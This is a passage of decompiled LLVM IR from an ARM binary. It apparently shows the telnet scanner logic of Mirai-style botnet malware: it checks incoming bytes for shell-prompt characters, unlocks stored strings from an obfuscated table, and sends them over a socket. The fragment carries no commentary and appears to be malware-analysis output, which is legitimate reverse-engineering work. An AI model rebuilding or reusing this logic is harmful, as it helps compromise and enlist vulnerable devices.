  %v4_1030c = zext i8 %v3_1030c to i32
  store i32 %v4_1030c, i32* %r2.global-to-local, align 4
  %v2_10310 = icmp ugt i8 %v3_1030c, 61
  store i1 %v2_10310, i1* %cpsr_c.global-to-local, align 1
  %v7_10310 = icmp eq i8 %v3_1030c, 62
  store i1 %v7_10310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10310, label %dec_label_pc_1031c, label %bb398

bb398:                                            ; preds = %dec_label_pc_1030c
  %v3_10314 = icmp ugt i8 %v3_1030c, 57
  store i1 %v3_10314, i1* %cpsr_c.global-to-local, align 1
  %v8_10314 = icmp eq i8 %v3_1030c, 58
  store i1 %v8_10314, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10314, label %dec_label_pc_1031c, label %dec_label_pc_102e8

dec_label_pc_1031c:                               ; preds = %dec_label_pc_1030c, %bb398, %dec_label_pc_102f8, %dec_label_pc_102f0, %dec_label_pc_102e8, %dec_label_pc_102d4, %dec_label_pc_102b0, %dec_label_pc_102cc, %dec_label_pc_102c4, %bb397
  %v0_10320 = phi i32 [ %v1_102a4, %dec_label_pc_102d4 ], [ %v1_102a4, %dec_label_pc_102b0 ], [ %v1_102a4, %dec_label_pc_102cc ], [ %v1_102a4, %dec_label_pc_102c4 ], [ %v1_102a4, %bb397 ], [ %v1_10304, %dec_label_pc_102e8 ], [ %v1_10304, %dec_label_pc_102f0 ], [ %v1_10304, %dec_label_pc_102f8 ], [ %v1_10304, %bb398 ], [ %v1_10304, %dec_label_pc_1030c ]
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_10320 = add i32 %v0_10320, 1
  store i32 %v1_10320, i32* @r7, align 4
  %v1_10324 = call i32 @table_unlock_val(i32 24)
  store i32 %v2_10740, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_10334 = call i32 @table_retrieve_val(i32 24, i32* nonnull %stack_var_-60)
  store i32 %v3_10334, i32* %r0.global-to-local, align 4
  %v3_10338 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10338, i32* %r2.global-to-local, align 4
  store i32 %v3_10334, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10344 = load i32, i32* @r5, align 4
  %v1_10344 = add i32 %v0_10344, 4
  %v2_10344 = inttoptr i32 %v1_10344 to i32*
  %v3_10344 = load i32, i32* %v2_10344, align 4
  store i32 %v3_10344, i32* %r0.global-to-local, align 4
  %v4_10348 = call i32 @__libc_send(i32 %v3_10344, i32 %v3_10334, i32 %v3_10338, i32 16384)
  store i32 %v4_10348, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10358 = load i32, i32* @r5, align 4
  %v1_10358 = add i32 %v0_10358, 4
  %v2_10358 = inttoptr i32 %v1_10358 to i32*
  %v3_10358 = load i32, i32* %v2_10358, align 4
  store i32 %v3_10358, i32* %r0.global-to-local, align 4
  %v4_1035c = call i32 @__libc_send(i32 %v3_10358, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_10364 = call i32 @table_lock_val(i32 24)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_1036c = load i32, i32* @r5, align 4
  %v2_1036c = add i32 %v1_1036c, 12
  %v3_1036c = inttoptr i32 %v2_1036c to i32*
  store i32 8, i32* %v3_1036c, align 4
  br label %dec_label_pc_101a4

dec_label_pc_10374:                               ; preds = %dec_label_pc_10084
  %v1_10374 = add i32 %v0_10084, 24
  %v2_10374 = inttoptr i32 %v1_10374 to i32*
  %v3_10374 = load i32, i32* %v2_10374, align 4
  store i32 %v3_10374, i32* %r2.global-to-local, align 4
  %v1_10378 = add i32 %v3_10374, -1
  store i32 %v1_10378, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1037c = icmp eq i32 %v1_10378, 0
  store i1 %v2_1037c, i1* %cpsr_z.global-to-local, align 1
  %tmp399 = icmp slt i32 %v1_10378, 1
  br i1 %tmp399, label %dec_label_pc_10008.backedge.thread, label %dec_label_pc_10384

dec_label_pc_10384:                               ; preds = %dec_label_pc_10374
  %v2_10384 = add i32 %v1_10378, %v0_10084
  store i32 %v2_10384, i32* %r3.global-to-local, align 4
  %v1_10388 = add i32 %v2_10384, 28
  %v2_10388 = inttoptr i32 %v1_10388 to i8*
  %v3_10388 = load i8, i8* %v2_10388, align 1
  %v4_10388 = zext i8 %v3_10388 to i32
  store i32 %v4_10388, i32* %r3.global-to-local, align 4
  %v2_1038c = icmp ugt i8 %v3_10388, 61
  store i1 %v2_1038c, i1* %cpsr_c.global-to-local, align 1
  %v7_1038c = icmp eq i8 %v3_10388, 62
  store i1 %v7_1038c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1038c, label %dec_label_pc_103f0, label %bb400

bb400:                                            ; preds = %dec_label_pc_10384
  %v3_10390 = icmp ugt i8 %v3_10388, 57
  store i1 %v3_10390, i1* %cpsr_c.global-to-local, align 1
  %v8_10390 = icmp eq i8 %v3_10388, 58
  store i1 %v8_10390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10390, label %dec_label_pc_103f0, label %dec_label_pc_10398

dec_label_pc_10398:                               ; preds = %bb400
  %v2_10398 = icmp ugt i8 %v3_10388, 35
  store i1 %v2_10398, i1* %cpsr_c.global-to-local, align 1
  %v7_10398 = icmp eq i8 %v3_10388, 36
  store i1 %v7_10398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10398, label %dec_label_pc_103f0, label %dec_label_pc_103a0

dec_label_pc_103a0:                               ; preds = %dec_label_pc_10398
  %v2_103a0 = icmp ugt i8 %v3_10388, 34
  store i1 %v2_103a0, i1* %cpsr_c.global-to-local, align 1
  %v7_103a0 = icmp eq i8 %v3_10388, 35
  store i1 %v7_103a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103a0, label %dec_label_pc_103f0, label %dec_label_pc_103a8

dec_label_pc_103a8:                               ; preds = %dec_label_pc_103a0
  %v2_103a8 = icmp ugt i8 %v3_10388, 36
  store i1 %v2_103a8, i1* %cpsr_c.global-to-local, align 1
  %v7_103a8 = icmp eq i8 %v3_10388, 37
  store i1 %v7_103a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103a8, label %dec_label_pc_103f0, label %dec_label_pc_103d8.preheader

dec_label_pc_103d8.preheader:                     ; preds = %dec_label_pc_103a8
  %v3_103ac = add i32 %v0_10084, 28
  %v2_103b0 = add i32 %v3_103ac, %v3_10374
  store i32 %v2_103b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_103d8

dec_label_pc_103bc:                               ; preds = %bb401
  %v2_103bc = icmp ugt i8 %v3_103e0, 35
  store i1 %v2_103bc, i1* %cpsr_c.global-to-local, align 1
  %v7_103bc = icmp eq i8 %v3_103e0, 36
  store i1 %v7_103bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103bc, label %dec_label_pc_103f0, label %dec_label_pc_103c4

dec_label_pc_103c4:                               ; preds = %dec_label_pc_103bc
  %v2_103c4 = icmp ugt i8 %v3_103e0, 34
  store i1 %v2_103c4, i1* %cpsr_c.global-to-local, align 1
  %v7_103c4 = icmp eq i8 %v3_103e0, 35
  store i1 %v7_103c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103c4, label %dec_label_pc_103f0, label %dec_label_pc_103cc

dec_label_pc_103cc:                               ; preds = %dec_label_pc_103c4
  %v2_103cc = icmp ugt i8 %v3_103e0, 36
  store i1 %v2_103cc, i1* %cpsr_c.global-to-local, align 1
  %v7_103cc = icmp eq i8 %v3_103e0, 37
  store i1 %v7_103cc, i1* %cpsr_z.global-to-local, align 1
  %v1_103d0 = add i32 %v0_103d0, -1
  store i32 %v1_103d0, i32* %r3.global-to-local, align 4
  br i1 %v7_103cc, label %dec_label_pc_103f0, label %dec_label_pc_103d8

dec_label_pc_103d8:                               ; preds = %dec_label_pc_103d8.preheader, %dec_label_pc_103cc
  %v0_103d0 = phi i32 [ %v2_103b0, %dec_label_pc_103d8.preheader ], [ %v1_103d0, %dec_label_pc_103cc ]
  %v0_103d8 = phi i32 [ %v1_10378, %dec_label_pc_103d8.preheader ], [ %v1_103d8, %dec_label_pc_103cc ]
  %v1_103d8 = add i32 %v0_103d8, -1
  store i32 %v1_103d8, i32* %r1.global-to-local, align 4
  %v2_103d8 = icmp ne i32 %v0_103d8, 0
  store i1 %v2_103d8, i1* %cpsr_c.global-to-local, align 1
  %v7_103d8 = icmp eq i32 %v0_103d8, 1
  store i1 %v7_103d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103d8, label %dec_label_pc_10008.backedge.thread528, label %dec_label_pc_103e0

dec_label_pc_103e0:                               ; preds = %dec_label_pc_103d8
  %v1_103e0 = add i32 %v0_103d0, -2
  %v2_103e0 = inttoptr i32 %v1_103e0 to i8*
  %v3_103e0 = load i8, i8* %v2_103e0, align 1
  %v4_103e0 = zext i8 %v3_103e0 to i32
  store i32 %v4_103e0, i32* %r2.global-to-local, align 4
  %v2_103e4 = icmp ugt i8 %v3_103e0, 61
  store i1 %v2_103e4, i1* %cpsr_c.global-to-local, align 1
  %v7_103e4 = icmp eq i8 %v3_103e0, 62
  store i1 %v7_103e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103e4, label %dec_label_pc_103f0, label %bb401

bb401:                                            ; preds = %dec_label_pc_103e0
  %v3_103e8 = icmp ugt i8 %v3_103e0, 57
  store i1 %v3_103e8, i1* %cpsr_c.global-to-local, align 1
  %v8_103e8 = icmp eq i8 %v3_103e0, 58
  store i1 %v8_103e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_103e8, label %dec_label_pc_103f0, label %dec_label_pc_103bc

dec_label_pc_103f0:                               ; preds = %dec_label_pc_103e0, %bb401, %dec_label_pc_103cc, %dec_label_pc_103c4, %dec_label_pc_103bc, %dec_label_pc_103a8, %dec_label_pc_10384, %dec_label_pc_103a0, %dec_label_pc_10398, %bb400
  %v0_103f4 = phi i32 [ %v1_10378, %dec_label_pc_103a8 ], [ %v1_10378, %dec_label_pc_10384 ], [ %v1_10378, %dec_label_pc_103a0 ], [ %v1_10378, %dec_label_pc_10398 ], [ %v1_10378, %bb400 ], [ %v1_103d8, %dec_label_pc_103bc ], [ %v1_103d8, %dec_label_pc_103c4 ], [ %v1_103d8, %dec_label_pc_103cc ], [ %v1_103d8, %bb401 ], [ %v1_103d8, %dec_label_pc_103e0 ]
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_103f4 = add i32 %v0_103f4, 1
  store i32 %v1_103f4, i32* @r7, align 4
  %v1_103f8 = call i32 @table_unlock_val(i32 26)
  store i32 %v2_10740, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_10408 = call i32 @table_retrieve_val(i32 26, i32* nonnull %stack_var_-60)
  store i32 %v3_10408, i32* %r0.global-to-local, align 4
  %v3_1040c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_1040c, i32* %r2.global-to-local, align 4
  store i32 %v3_10408, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10418 = load i32, i32* @r5, align 4
  %v1_10418 = add i32 %v0_10418, 4
  %v2_10418 = inttoptr i32 %v1_10418 to i32*
  %v3_10418 = load i32, i32* %v2_10418, align 4
  store i32 %v3_10418, i32* %r0.global-to-local, align 4
  %v4_1041c = call i32 @__libc_send(i32 %v3_10418, i32 %v3_10408, i32 %v3_1040c, i32 16384)
  store i32 %v4_1041c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1042c = load i32, i32* @r5, align 4
  %v1_1042c = add i32 %v0_1042c, 4
  %v2_1042c = inttoptr i32 %v1_1042c to i32*
  %v3_1042c = load i32, i32* %v2_1042c, align 4
  store i32 %v3_1042c, i32* %r0.global-to-local, align 4
  %v4_10430 = call i32 @__libc_send(i32 %v3_1042c, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2, i32 16384)
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10438 = call i32 @table_lock_val(i32 26)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_10440 = load i32, i32* @r5, align 4
  %v2_10440 = add i32 %v1_10440, 12
  %v3_10440 = inttoptr i32 %v2_10440 to i32*
  store i32 7, i32* %v3_10440, align 4
  br label %dec_label_pc_101a4

dec_label_pc_10448:                               ; preds = %dec_label_pc_10084
  %v1_10448 = add i32 %v0_10084, 24
  %v2_10448 = inttoptr i32 %v1_10448 to i32*
  %v3_10448 = load i32, i32* %v2_10448, align 4
  store i32 %v3_10448, i32* %r2.global-to-local, align 4
  %v1_1044c = add i32 %v3_10448, -1
  store i32 %v1_1044c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10450 = icmp eq i32 %v1_1044c, 0
  store i1 %v2_10450, i1* %cpsr_z.global-to-local, align 1
  %tmp402 = icmp slt i32 %v1_1044c, 1
  br i1 %tmp402, label %dec_label_pc_10008.backedge.thread, label %dec_label_pc_10458

dec_label_pc_10458:                               ; preds = %dec_label_pc_10448
  %v2_10458 = add i32 %v1_1044c, %v0_10084
  store i32 %v2_10458, i32* %r3.global-to-local, align 4
  %v1_1045c = add i32 %v2_10458, 28
  %v2_1045c = inttoptr i32 %v1_1045c to i8*
  %v3_1045c = load i8, i8* %v2_1045c, align 1
  %v4_1045c = zext i8 %v3_1045c to i32
  store i32 %v4_1045c, i32* %r3.global-to-local, align 4
  %v2_10460 = icmp ugt i8 %v3_1045c, 61
  store i1 %v2_10460, i1* %cpsr_c.global-to-local, align 1
  %v7_10460 = icmp eq i8 %v3_1045c, 62
  store i1 %v7_10460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10460, label %dec_label_pc_104c4, label %bb403

bb403:                                            ; preds = %dec_label_pc_10458
  %v3_10464 = icmp ugt i8 %v3_1045c, 57
  store i1 %v3_10464, i1* %cpsr_c.global-to-local, align 1
  %v8_10464 = icmp eq i8 %v3_1045c, 58
  store i1 %v8_10464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10464, label %dec_label_pc_104c4, label %dec_label_pc_1046c

dec_label_pc_1046c:                               ; preds = %bb403
  %v2_1046c = icmp ugt i8 %v3_1045c, 35
  store i1 %v2_1046c, i1* %cpsr_c.global-to-local, align 1
  %v7_1046c = icmp eq i8 %v3_1045c, 36
  store i1 %v7_1046c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1046c, label %dec_label_pc_104c4, label %dec_label_pc_10474

dec_label_pc_10474:                               ; preds = %dec_label_pc_1046c
  %v2_10474 = icmp ugt i8 %v3_1045c, 34
  store i1 %v2_10474, i1* %cpsr_c.global-to-local, align 1
  %v7_10474 = icmp eq i8 %v3_1045c, 35
  store i1 %v7_10474, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10474, label %dec_label_pc_104c4, label %dec_label_pc_1047c

dec_label_pc_1047c:                               ; preds = %dec_label_pc_10474
  %v2_1047c = icmp ugt i8 %v3_1045c, 36
  store i1 %v2_1047c, i1* %cpsr_c.global-to-local, align 1
  %v7_1047c = icmp eq i8 %v3_1045c, 37
  store i1 %v7_1047c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1047c, label %dec_label_pc_104c4, label %dec_label_pc_104ac.preheader

dec_label_pc_104ac.preheader:                     ; preds = %dec_label_pc_1047c
  %v3_10480 = add i32 %v0_10084, 28
  %v2_10484 = add i32 %v3_10480, %v3_10448
  store i32 %v2_10484, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_104ac

dec_label_pc_10490:                               ; preds = %bb404
  %v2_10490 = icmp ugt i8 %v3_104b4, 35
  store i1 %v2_10490, i1* %cpsr_c.global-to-local, align 1
  %v7_10490 = icmp eq i8 %v3_104b4, 36
  store i1 %v7_10490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10490, label %dec_label_pc_104c4, label %dec_label_pc_10498

dec_label_pc_10498:                               ; preds = %dec_label_pc_10490
  %v2_10498 = icmp ugt i8 %v3_104b4, 34
  store i1 %v2_10498, i1* %cpsr_c.global-to-local, align 1
  %v7_10498 = icmp eq i8 %v3_104b4, 35
  store i1 %v7_10498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10498, label %dec_label_pc_104c4, label %dec_label_pc_104a0

dec_label_pc_104a0:                               ; preds = %dec_label_pc_10498
  %v2_104a0 = icmp ugt i8 %v3_104b4, 36
  store i1 %v2_104a0, i1* %cpsr_c.global-to-local, align 1
  %v7_104a0 = icmp eq i8 %v3_104b4, 37
  store i1 %v7_104a0, i1* %cpsr_z.global-to-local, align 1
  %v1_104a4 = add i32 %v0_104a4, -1
  store i32 %v1_104a4, i32* %r3.global-to-local, align 4
  br i1 %v7_104a0, label %dec_label_pc_104c4, label %dec_label_pc_104ac

dec_label_pc_104ac:                               ; preds = %dec_label_pc_104ac.preheader, %dec_label_pc_104a0
  %v0_104a4 = phi i32 [ %v2_10484, %dec_label_pc_104ac.preheader ], [ %v1_104a4, %dec_label_pc_104a0 ]
  %v0_104ac = phi i32 [ %v1_1044c, %dec_label_pc_104ac.preheader ], [ %v1_104ac, %dec_label_pc_104a0 ]
  %v1_104ac = add i32 %v0_104ac, -1
  store i32 %v1_104ac, i32* %r1.global-to-local, align 4
  %v2_104ac = icmp ne i32 %v0_104ac, 0
  store i1 %v2_104ac, i1* %cpsr_c.global-to-local, align 1
  %v7_104ac = icmp eq i32 %v0_104ac, 1
  store i1 %v7_104ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_104ac, label %dec_label_pc_10008.backedge.thread528, label %dec_label_pc_104b4

dec_label_pc_104b4:                               ; preds = %dec_label_pc_104ac
  %v1_104b4 = add i32 %v0_104a4, -2
  %v2_104b4 = inttoptr i32 %v1_104b4 to i8*
  %v3_104b4 = load i8, i8* %v2_104b4, align 1
  %v4_104b4 = zext i8 %v3_104b4 to i32
  store i32 %v4_104b4, i32* %r2.global-to-local, align 4
  %v2_104b8 = icmp ugt i8 %v3_104b4, 61
  store i1 %v2_104b8, i1* %cpsr_c.global-to-local, align 1
  %v7_104b8 = icmp eq i8 %v3_104b4, 62
  store i1 %v7_104b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_104b8, label %dec_label_pc_104c4, label %bb404

bb404:                                            ; preds = %dec_label_pc_104b4
  %v3_104bc = icmp ugt i8 %v3_104b4, 57
  store i1 %v3_104bc, i1* %cpsr_c.global-to-local, align 1
  %v8_104bc = icmp eq i8 %v3_104b4, 58
  store i1 %v8_104bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_104bc, label %dec_label_pc_104c4, label %dec_label_pc_10490

dec_label_pc_104c4:                               ; preds = %dec_label_pc_104b4, %bb404, %dec_label_pc_104a0, %dec_label_pc_10498, %dec_label_pc_10490, %dec_label_pc_1047c, %dec_label_pc_10458, %dec_label_pc_10474, %dec_label_pc_1046c, %bb403
  %v0_104c8 = phi i32 [ %v1_1044c, %dec_label_pc_1047c ], [ %v1_1044c, %dec_label_pc_10458 ], [ %v1_1044c, %dec_label_pc_10474 ], [ %v1_1044c, %dec_label_pc_1046c ], [ %v1_1044c, %bb403 ], [ %v1_104ac, %dec_label_pc_10490 ], [ %v1_104ac, %dec_label_pc_10498 ], [ %v1_104ac, %dec_label_pc_104a0 ], [ %v1_104ac, %bb404 ], [ %v1_104ac, %dec_label_pc_104b4 ]
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_104c8 = add i32 %v0_104c8, 1
  store i32 %v1_104c8, i32* @r7, align 4
  %v1_104cc = call i32 @table_unlock_val(i32 27)
  store i32 %v2_10740, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_104dc = call i32 @table_retrieve_val(i32 27, i32* nonnull %stack_var_-60)
  store i32 %v3_104dc, i32* %r0.global-to-local, align 4
  %v3_104e0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_104e0, i32* %r2.global-to-local, align 4
  store i32 %v3_104dc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_104ec = load i32, i32* @r5, align 4
  %v1_104ec = add i32 %v0_104ec, 4
  %v2_104ec = inttoptr i32 %v1_104ec to i32*
  %v3_104ec = load i32, i32* %v2_104ec, align 4
  store i32 %v3_104ec, i32* %r0.global-to-local, align 4
  %v4_104f0 = call i32 @__libc_send(i32 %v3_104ec, i32 %v3_104dc, i32 %v3_104e0, i32 16384)
  store i32 %v4_104f0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10500 = load i32, i32* @r5, align 4
  %v1_10500 = add i32 %v0_10500, 4
  %v2_10500 = inttoptr i32 %v1_10500 to i32*
  %v3_10500 = load i32, i32* %v2_10500, align 4
  store i32 %v3_10500, i32* %r0.global-to-local, align 4
  %v4_10504 = call i32 @__libc_send(i32 %v3_10500, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2, i32 16384)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_1050c = call i32 @table_lock_val(i32 27)
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_10514 = load i32, i32* @r5, align 4
  %v2_10514 = add i32 %v1_10514, 12
  %v3_10514 = inttoptr i32 %v2_10514 to i32*
  store i32 9, i32* %v3_10514, align 4
  br label %dec_label_pc_101a4

dec_label_pc_1051c:                               ; preds = %dec_label_pc_10084
  %v1_1051c = add i32 %v0_10084, 24
  %v2_1051c = inttoptr i32 %v1_1051c to i32*
  %v3_1051c = load i32, i32* %v2_1051c, align 4
  store i32 %v3_1051c, i32* %r2.global-to-local, align 4
  %v1_10520 = add i32 %v3_1051c, -1
  store i32 %v1_10520, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10524 = icmp eq i32 %v1_10520, 0
  store i1 %v2_10524, i1* %cpsr_z.global-to-local, align 1
  %tmp405 = icmp slt i32 %v1_10520, 1
  br i1 %tmp405, label %dec_label_pc_10008.backedge.thread, label %dec_label_pc_1052c

dec_label_pc_1052c:                               ; preds = %dec_label_pc_1051c
  %v2_1052c = add i32 %v1_10520, %v0_10084
  store i32 %v2_1052c, i32* %r3.global-to-local, align 4
  %v1_10530 = add i32 %v2_1052c, 28
  %v2_10530 = inttoptr i32 %v1_10530 to i8*
  %v3_10530 = load i8, i8* %v2_10530, align 1
  %v4_10530 = zext i8 %v3_10530 to i32
  store i32 %v4_10530, i32* %r3.global-to-local, align 4
  %v2_10534 = icmp ugt i8 %v3_10530, 61
  store i1 %v2_10534, i1* %cpsr_c.global-to-local, align 1
  %v7_10534 = icmp eq i8 %v3_10530, 62
  store i1 %v7_10534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10534, label %dec_label_pc_10658, label %bb406

bb406:                                            ; preds = %dec_label_pc_1052c
  %v3_10538 = icmp ugt i8 %v3_10530, 57
  store i1 %v3_10538, i1* %cpsr_c.global-to-local, align 1
  %v8_10538 = icmp eq i8 %v3_10530, 58
  store i1 %v8_10538, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10538, label %dec_label_pc_10658, label %dec_label_pc_10540

dec_label_pc_10540:                               ; preds = %bb406
  %v2_10540 = icmp ugt i8 %v3_10530, 35
  store i1 %v2_10540, i1* %cpsr_c.global-to-local, align 1
  %v7_10540 = icmp eq i8 %v3_10530, 36
  store i1 %v7_10540, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10540, label %dec_label_pc_10658, label %dec_label_pc_10548

dec_label_pc_10548:                               ; preds = %dec_label_pc_10540
  %v2_10548 = icmp ugt i8 %v3_10530, 34
  store i1 %v2_10548, i1* %cpsr_c.global-to-local, align 1
  %v7_10548 = icmp eq i8 %v3_10530, 35
  store i1 %v7_10548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10548, label %dec_label_pc_10658, label %dec_label_pc_10550

dec_label_pc_10550:                               ; preds = %dec_label_pc_10548
  %v2_10550 = icmp ugt i8 %v3_10530, 36
  store i1 %v2_10550, i1* %cpsr_c.global-to-local, align 1
  %v7_10550 = icmp eq i8 %v3_10530, 37
  store i1 %v7_10550, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10550, label %dec_label_pc_10658, label %dec_label_pc_10640.preheader

dec_label_pc_10640.preheader:                     ; preds = %dec_label_pc_10550
  %v3_10554 = add i32 %v0_10084, 28
  %v2_10558 = add i32 %v3_10554, %v3_1051c
  store i32 %v2_10558, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10640

dec_label_pc_10624:                               ; preds = %bb407
  %v2_10624 = icmp ugt i8 %v3_10648, 35
  store i1 %v2_10624, i1* %cpsr_c.global-to-local, align 1
  %v7_10624 = icmp eq i8 %v3_10648, 36
  store i1 %v7_10624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10624, label %dec_label_pc_10658, label %dec_label_pc_1062c

dec_label_pc_1062c:                               ; preds = %dec_label_pc_10624
  %v2_1062c = icmp ugt i8 %v3_10648, 34
  store i1 %v2_1062c, i1* %cpsr_c.global-to-local, align 1
  %v7_1062c = icmp eq i8 %v3_10648, 35
  store i1 %v7_1062c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1062c, label %dec_label_pc_10658, label %dec_label_pc_10634

dec_label_pc_10634:                               ; preds = %dec_label_pc_1062c
  %v2_10634 = icmp ugt i8 %v3_10648, 36
  store i1 %v2_10634, i1* %cpsr_c.global-to-local, align 1
  %v7_10634 = icmp eq i8 %v3_10648, 37
  store i1 %v7_10634, i1* %cpsr_z.global-to-local, align 1
  %v1_10638 = add i32 %v0_10638, -1
  store i32 %v1_10638, i32* %r3.global-to-local, align 4
  br i1 %v7_10634, label %dec_label_pc_10658, label %dec_label_pc_10640

dec_label_pc_10640:                               ; preds = %dec_label_pc_10640.preheader, %dec_label_pc_10634
  %v0_10638 = phi i32 [ %v2_10558, %dec_label_pc_10640.preheader ], [ %v1_10638, %dec_label_pc_10634 ]
  %v0_10640 = phi i32 [ %v1_10520, %dec_label_pc_10640.preheader ], [ %v1_10640, %dec_label_pc_10634 ]
  %v1_10640 = add i32 %v0_10640, -1
  store i32 %v1_10640, i32* %r1.global-to-local, align 4
  %v2_10640 = icmp ne i32 %v0_10640, 0
  store i1 %v2_10640, i1* %cpsr_c.global-to-local, align 1
  %v7_10640 = icmp eq i32 %v0_10640, 1
  store i1 %v7_10640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10640, label %dec_label_pc_10008.backedge.thread528, label %dec_label_pc_10648

dec_label_pc_10648:                               ; preds = %dec_label_pc_10640
  %v1_10648 = add i32 %v0_10638, -2
  %v2_10648 = inttoptr i32 %v1_10648 to i8*
  %v3_10648 = load i8, i8* %v2_10648, align 1
  %v4_10648 = zext i8 %v3_10648 to i32
  store i32 %v4_10648, i32* %r2.global-to-local, align 4
  %v2_1064c = icmp ugt i8 %v3_10648, 61
  store i1 %v2_1064c, i1* %cpsr_c.global-to-local, align 1
  %v7_1064c = icmp eq i8 %v3_10648, 62
  store i1 %v7_1064c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1064c, label %dec_label_pc_10658, label %bb407

bb407:                                            ; preds = %dec_label_pc_10648
  %v3_10650 = icmp ugt i8 %v3_10648, 57
  store i1 %v3_10650, i1* %cpsr_c.global-to-local, align 1
  %v8_10650 = icmp eq i8 %v3_10648, 58
  store i1 %v8_10650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10650, label %dec_label_pc_10658, label %dec_label_pc_10624

dec_label_pc_10658:                               ; preds = %dec_label_pc_10648, %bb407, %dec_label_pc_10634, %dec_label_pc_1062c, %dec_label_pc_10624, %dec_label_pc_10550, %dec_label_pc_1052c, %dec_label_pc_10548, %dec_label_pc_10540, %bb406
  %v0_1065c = phi i32 [ %v1_10520, %dec_label_pc_10550 ], [ %v1_10520, %dec_label_pc_1052c ], [ %v1_10520, %dec_label_pc_10548 ], [ %v1_10520, %dec_label_pc_10540 ], [ %v1_10520, %bb406 ], [ %v1_10640, %dec_label_pc_10624 ], [ %v1_10640, %dec_label_pc_1062c ], [ %v1_10640, %dec_label_pc_10634 ], [ %v1_10640, %bb407 ], [ %v1_10640, %dec_label_pc_10648 ]
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_1065c = add i32 %v0_1065c, 1
  store i32 %v1_1065c, i32* @r7, align 4
  %v1_10660 = call i32 @table_unlock_val(i32 25)
  store i32 %v2_10740, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_10670 = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-60)
  store i32 %v3_10670, i32* %r0.global-to-local, align 4
  %v3_10674 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10674, i32* %r2.global-to-local, align 4
  store i32 %v3_10670, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10680 = load i32, i32* @r5, align 4
  %v1_10680 = add i32 %v0_10680, 4
  %v2_10680 = inttoptr i32 %v1_10680 to i32*
